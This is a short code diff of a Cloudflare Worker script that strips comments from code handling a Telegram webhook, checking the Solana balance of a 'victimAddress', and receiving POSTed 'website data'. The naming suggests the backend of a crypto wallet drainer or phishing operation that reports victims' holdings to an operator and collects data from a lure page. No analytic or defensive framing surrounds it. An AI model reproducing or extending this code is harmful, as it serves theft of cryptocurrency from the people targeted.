@@ -18,7 +18,6 @@ export default {
       return new Response(null, { headers: corsHeaders });
     }
 
-    // --- TELEGRAM WEBHOOK ---
     if (request.method === "POST" && url.pathname === "/webhook") {
       try {
         const update = await request.json();
@@ -50,7 +49,6 @@ export default {
 
           if (data.startsWith("balance:")) {
             const victimAddress = data.split(":")[1];
-            // NEUER RPC (Extrnode blockt Cloudflare nicht)
             const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
             const victimPubkey = new PublicKey(victimAddress);
             const solBalance = await connection.getBalance(victimPubkey);
@@ -138,7 +136,6 @@ export default {
       }
     }
 
-    // --- WEBSITE DATEN ---
     if (request.method === "POST") {
       try {
         const data = await request.json();
